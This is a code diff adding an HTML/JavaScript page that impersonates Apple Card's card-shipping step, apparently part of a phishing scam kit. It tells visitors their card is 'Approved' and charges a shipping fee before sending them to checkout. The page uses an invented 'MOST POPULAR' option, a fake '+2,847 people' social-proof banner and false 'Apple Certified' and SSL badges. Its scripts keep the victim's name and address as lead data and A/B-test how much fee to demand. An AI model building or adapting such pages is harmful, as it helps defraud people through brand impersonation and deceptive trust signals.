@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Card Shipping — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--success:#34C759;--warning:#FF9F0A;--surface:#FFFFFF}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200)}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-step{font-size:0.75rem;color:var(--gray-400);width:40px;text-align:right}
+
+        .progress{height:3px;background:var(--gray-200)}
+        .progress-bar{height:100%;background:var(--apple-blue);border-radius:2px;width:90%}
+
+        .content{padding:24px 20px}
+
+        /* Card mini preview */
+        .card-mini{
+            width:100%;padding:16px;background:var(--apple-black);border-radius:16px;margin-bottom:24px;
+            display:flex;align-items:center;gap:14px;color:#fff;position:relative;overflow:hidden;
+        }
+        .card-mini::before{content:'';position:absolute;top:-50%;right:-50%;width:200px;height:200px;background:radial-gradient(circle,rgba(0,113,227,0.15),transparent);pointer-events:none}
+        .card-mini-visual{width:60px;height:38px;border-radius:8px;position:relative;overflow:hidden;flex-shrink:0}
+        .card-mini-visual .bg{position:absolute;inset:0}
+        .card-mini-visual .logo{position:absolute;top:8px;left:8px}
+        .card-mini-visual .logo img{width:12px;height:14px}
+        .card-mini-info{flex:1}
+        .card-mini-info .cmi-name{font-size:0.75rem;font-weight:600;margin-bottom:2px}
+        .card-mini-info .cmi-limit{font-size:0.625rem;color:rgba(255,255,255,0.5)}
+        .card-mini-badge{padding:4px 10px;background:rgba(52,199,89,0.15);border-radius:8px;font-size:0.625rem;font-weight:600;color:var(--success)}
+
+        .section-title{font-size:1.125rem;font-weight:700;margin-bottom:4px}
+        .section-desc{font-size:0.8125rem;color:var(--gray-500);margin-bottom:20px;line-height:1.5}
+
+        /* Shipping options */
+        .shipping-options{display:flex;flex-direction:column;gap:12px;margin-bottom:24px}
+        .ship-opt{
+            padding:16px;border:2px solid var(--gray-200);border-radius:14px;cursor:pointer;
+            transition:all 0.2s ease;position:relative;overflow:hidden;
+        }
+        .ship-opt:hover{border-color:var(--apple-blue)}
+        .ship-opt.selected{border-color:var(--apple-blue);background:rgba(0,113,227,0.02)}
+        .ship-opt.recommended{border-color:var(--apple-blue)}
+        .ship-opt .rec-badge{position:absolute;top:0;right:0;padding:3px 10px;background:var(--apple-blue);color:#fff;font-size:0.5625rem;font-weight:700;border-radius:0 12px 0 8px;letter-spacing:0.04em;display:none}
+        .ship-opt.recommended .rec-badge{display:block}
+
+        .ship-top{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+        .ship-radio{width:20px;height:20px;border-radius:50%;border:2px solid var(--gray-300);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.2s}
+        .ship-opt.selected .ship-radio{border-color:var(--apple-blue)}
+        .ship-radio .dot{width:10px;height:10px;border-radius:50%;background:var(--apple-blue);transform:scale(0);transition:transform 0.2s}
+        .ship-opt.selected .ship-radio .dot{transform:scale(1)}
+        .ship-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .ship-icon svg{width:18px;height:18px}
+        .ship-details{flex:1}
+        .ship-name{font-size:0.9375rem;font-weight:600}
+        .ship-time{font-size:0.75rem;color:var(--gray-500)}
+        .ship-price{font-size:1rem;font-weight:700;color:var(--apple-black);text-align:right;white-space:nowrap}
+
+        .ship-features{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;padding-left:32px}
+        .ship-feature{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--gray-500)}
+        .ship-feature svg{width:12px;height:12px;fill:var(--success)}
+
+        /* Address preview */
+        .addr-summary{padding:14px 16px;background:var(--gray-100);border-radius:14px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
+        .addr-summary svg{width:20px;height:20px;fill:var(--gray-400);flex-shrink:0}
+        .addr-summary .as-text{flex:1;font-size:0.8125rem;color:var(--gray-600);line-height:1.4}
+        .addr-summary .as-edit{font-size:0.75rem;color:var(--apple-blue);font-weight:600;cursor:pointer;white-space:nowrap}
+
+        /* Social proof */
+        .social-proof{display:flex;align-items:center;gap:10px;padding:12px 16px;background:rgba(52,199,89,0.06);border:1px solid rgba(52,199,89,0.12);border-radius:12px;margin-bottom:20px}
+        .sp-avatars{display:flex}
+        .sp-avatar{width:24px;height:24px;border-radius:50%;border:2px solid var(--surface);margin-left:-6px;background:linear-gradient(135deg,var(--apple-blue),var(--success));display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;font-weight:700}
+        .sp-avatar:first-child{margin-left:0}
+        .sp-text{font-size:0.75rem;color:var(--gray-600);line-height:1.3}
+        .sp-text strong{color:var(--success)}
+
+        .submit-btn{
+            width:100%;padding:16px;border:none;border-radius:14px;
+            font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;
+            background:var(--apple-blue);color:#fff;
+            transition:all 0.3s ease;
+        }
+        .submit-btn:hover{background:#0077ED}
+        .submit-btn:active{transform:scale(0.98)}
+        .submit-btn:disabled{opacity:0.4;cursor:not-allowed}
+
+        .price-summary{display:flex;justify-content:space-between;padding:12px 0;font-size:0.875rem;margin-bottom:8px}
+        .price-summary .ps-label{color:var(--gray-500)}
+        .price-summary .ps-value{font-weight:700}
+
+        .secure-badges{display:flex;align-items:center;justify-content:center;gap:16px;margin-top:16px;padding:12px 0}
+        .sb{display:flex;align-items:center;gap:4px;font-size:0.625rem;color:var(--gray-400)}
+        .sb svg{width:14px;height:14px;fill:var(--gray-400)}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <div class="nav-title">Card Shipping</div>
+            <div class="nav-step">12/13</div>
+        </div>
+        <div class="progress"><div class="progress-bar"></div></div>
+
+        <div class="content">
+            <!-- Card mini preview -->
+            <div class="card-mini">
+                <div class="card-mini-visual">
+                    <div class="bg" id="miniCardBg"></div>
+                    <div class="logo"><img id="miniCardLogo" src="assets/images/logo3d.svg" alt="" style="width:12px;height:14px"></div>
+                </div>
+                <div class="card-mini-info">
+                    <div class="cmi-name" id="cardHolderName">Guest</div>
+                    <div class="cmi-limit">Limit: <span id="cardLimit">$5,000.00</span></div>
+                </div>
+                <div class="card-mini-badge">Approved</div>
+            </div>
+
+            <div class="section-title">How would you like it delivered?</div>
+            <div class="section-desc">Choose the shipping method for your titanium Apple Card.</div>
+
+            <!-- Address preview -->
+            <div class="addr-summary">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                <div class="as-text" id="addrText">Loading address...</div>
+                <span class="as-edit" onclick="window.location.href=buildUrl('cep.html')">Edit</span>
+            </div>
+
+            <!-- Shipping Options (A/B Test applied via JS) -->
+            <div class="shipping-options" id="shippingOptions">
+                <div class="ship-opt" id="shipEconomico" data-price="17.45" data-type="economico" onclick="selectShip(this)">
+                    <div class="ship-top">
+                        <div class="ship-radio"><div class="dot"></div></div>
+                        <div class="ship-icon" style="background:rgba(134,134,139,0.1)"><svg viewBox="0 0 24 24" fill="#86868B"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zM18 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
+                        <div class="ship-details">
+                            <div class="ship-name">Standard Shipping</div>
+                            <div class="ship-time">Delivery in 7-10 business days</div>
+                        </div>
+                        <div class="ship-price" id="priceEconomico">$17.45</div>
+                    </div>
+                    <div class="ship-features">
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
+                    </div>
+                </div>
+
+                <div class="ship-opt recommended selected" id="shipExpresso" data-price="22.45" data-type="expresso" onclick="selectShip(this)">
+                    <div class="rec-badge">MOST POPULAR</div>
+                    <div class="ship-top">
+                        <div class="ship-radio"><div class="dot"></div></div>
+                        <div class="ship-icon" style="background:rgba(0,113,227,0.1)"><svg viewBox="0 0 24 24" fill="#0071E3"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zM18 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
+                        <div class="ship-details">
+                            <div class="ship-name">Express Shipping</div>
+                            <div class="ship-time">Delivery in 4-5 business days</div>
+                        </div>
+                        <div class="ship-price" id="priceExpresso">$22.45</div>
+                    </div>
+                    <div class="ship-features">
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Insured</div>
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Priority</div>
+                    </div>
+                </div>
+
+                <div class="ship-opt" id="shipPremium" data-price="27.97" data-type="premium" onclick="selectShip(this)">
+                    <div class="ship-top">
+                        <div class="ship-radio"><div class="dot"></div></div>
+                        <div class="ship-icon" style="background:rgba(175,82,222,0.1)"><svg viewBox="0 0 24 24" fill="#AF52DE"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg></div>
+                        <div class="ship-details">
+                            <div class="ship-name">Premium Shipping</div>
+                            <div class="ship-time">Delivery in 1-2 business days</div>
+                        </div>
+                        <div class="ship-price" id="pricePremium">$27.97</div>
+                    </div>
+                    <div class="ship-features">
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Full insurance</div>
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Ultra-fast</div>
+                        <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Exclusive packaging</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Social proof -->
+            <div class="social-proof">
+                <div class="sp-avatars">
+                    <div class="sp-avatar">M</div>
+                    <div class="sp-avatar" style="background:linear-gradient(135deg,#FF9F0A,#FF3B30)">R</div>
+                    <div class="sp-avatar" style="background:linear-gradient(135deg,#AF52DE,#0071E3)">A</div>
+                </div>
+                <div class="sp-text"><strong>+2,847 people</strong> completed their Apple Card shipping in the last 24h</div>
+            </div>
+
+            <!-- Price summary -->
+            <div class="price-summary">
+                <span class="ps-label">Shipping cost</span>
+                <span class="ps-value" id="priceDisplay">$22.45</span>
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="proceedToCheckout()">Complete shipping — <span id="btnPrice">$22.45</span></button>
+
+            <div class="secure-badges">
+                <div class="sb"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure payment</div>
+                <div class="sb"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg> 256-bit SSL</div>
+                <div class="sb"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Apple Certified</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+        LeadData.update({ page: 'envio' });
+        const data = LeadData.load();
+
+        // ═══════════════════════════════════════════════════
+        // A/B TEST — Shipping price groups
+        // Group A: 17.45 / 22.45 / 27.97 (control)
+        // Group B: 19.90 / 22.45 / 27.97
+        // Group C: 23.90 / 29.90 (only 2 options)
+        const FRETE_AB_ATIVO = false;
+        const FRETE_GRUPO_FIXO = 'A';
+        // ═══════════════════════════════════════════════════
+        function getABGroup() {
+            if (!FRETE_AB_ATIVO) return FRETE_GRUPO_FIXO;
+            const saved = data.ab_frete_grupo;
+            if (saved && ['A','B','C'].includes(saved)) return saved;
+            const lid = (localStorage.getItem('_boti_lid') || '') + 'ab_frete';
+            let hash = 0;
+            for (let i = 0; i < lid.length; i++) {
+                hash = ((hash << 5) - hash) + lid.charCodeAt(i);
+                hash |= 0;
+            }
+            const mod = Math.abs(hash) % 3;
+            return mod === 0 ? 'A' : mod === 1 ? 'B' : 'C';
+        }
+
+        const abGroup = getABGroup();
+        LeadData.update({ page: 'envio', ab_frete_grupo: abGroup });
+
+        if (window._tracker) {
+            window._tracker.trackEvent('abtest', JSON.stringify({ test: 'frete_precos', group: abGroup }));
+        }
+
+        const fmt = (v) => `$${v.toFixed(2)}`;
+
+        const elEconomico = document.getElementById('shipEconomico');
+        const elExpresso = document.getElementById('shipExpresso');
+        const elPremium = document.getElementById('shipPremium');
+
+        if (abGroup === 'A') {
+            // Control: leave defaults
+        } else if (abGroup === 'B') {
+            elEconomico.dataset.price = '19.90';
+            document.getElementById('priceEconomico').textContent = fmt(19.90);
+        } else if (abGroup === 'C') {
+            elEconomico.dataset.price = '23.90';
+            document.getElementById('priceEconomico').textContent = fmt(23.90);
+            elExpresso.style.display = 'none';
+            elExpresso.classList.remove('selected', 'recommended');
+            elPremium.dataset.price = '27.97';
+            document.getElementById('pricePremium').textContent = fmt(27.97);
+            elPremium.classList.add('recommended');
+            if (!elPremium.querySelector('.rec-badge')) {
+                const badge = document.createElement('div');
+                badge.className = 'rec-badge';
+                badge.textContent = 'MOST POPULAR';
+                elPremium.insertBefore(badge, elPremium.firstChild);
+            }
+            elEconomico.classList.remove('selected');
+            elPremium.classList.add('selected');
+        }
+
+        const colorMap = {
+            silver: 'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
+            black: 'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
+            gold: 'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
+        };
+
+        document.getElementById('miniCardBg').style.background = colorMap[data.cartao_cor||'silver'] || colorMap.silver;
+        document.getElementById('cardHolderName').textContent = data.nome || 'Guest';
+        document.getElementById('cardLimit').textContent = `$${(data.limite_aprovado||5000).toLocaleString('en-US')}.00`;
+
+        // Address
+        if(data.rua){
+            const freguesia = data.freguesia || data.bairro;
+            const localidade = data.localidade || data.cidade;
+            const distrito = data.distrito || data.uf;
+            const codigoPostal = data.codigo_postal || data.cep;
+            let addr = data.numero ? `${data.numero} ${data.rua}` : data.rua;
+            if(data.complemento) addr += `, ${data.complemento}`;
+            if(localidade) addr += ` — ${localidade}, ${distrito||''}`;
+            if(codigoPostal) addr += ` • ${codigoPostal}`;
+            document.getElementById('addrText').textContent = addr;
+        }
+
+        const initialSelected = document.querySelector('.ship-opt.selected');
+        let selectedPrice = initialSelected ? parseFloat(initialSelected.dataset.price) : 22.45;
+        let selectedType = initialSelected ? initialSelected.dataset.type : 'expresso';
+
+        document.getElementById('priceDisplay').textContent = fmt(selectedPrice);
+        document.getElementById('btnPrice').textContent = fmt(selectedPrice);
+
+        function selectShip(el){
+            document.querySelectorAll('.ship-opt').forEach(o=>o.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedPrice = parseFloat(el.dataset.price);
+            selectedType = el.dataset.type;
+            document.getElementById('priceDisplay').textContent = fmt(selectedPrice);
+            document.getElementById('btnPrice').textContent = fmt(selectedPrice);
+            if (window.track) window.track('AddToCart', {
+                value: selectedPrice,
+                currency: 'USD',
+                content_id: 'apple-card-us-' + selectedType,
+                content_name: 'Apple Card — ' + selectedType,
+                content_type: 'product'
+            });
+        }
+        window.selectShip = selectShip;
+
+        function proceedToCheckout(){
+            LeadData.update({
+                frete_tipo: selectedType,
+                frete_valor: selectedPrice,
+                ab_frete_grupo: abGroup,
+                envio_completed: true
+            });
+            window.location.href = buildUrl('checkout.html', { frete: selectedPrice.toFixed(2), tipo: selectedType, ab: abGroup });
+        }
+        window.proceedToCheckout = proceedToCheckout;
+    </script>
+</body>
+</html>
